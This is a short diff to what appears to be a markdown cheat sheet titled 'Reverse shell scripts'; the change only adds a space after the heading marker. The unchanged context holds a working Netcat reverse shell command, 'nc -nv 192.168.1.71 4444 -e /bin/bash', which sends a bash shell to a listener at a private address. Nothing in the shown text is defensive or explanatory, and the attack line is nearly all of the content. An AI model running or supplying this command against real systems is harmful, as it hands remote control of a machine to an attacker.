@@ -1,4 +1,4 @@
-#Reverse shell scripts
+# Reverse shell scripts
 
 ## Using Netcat
 cmd=nc -nv 192.168.1.71 4444 -e /bin/bash  
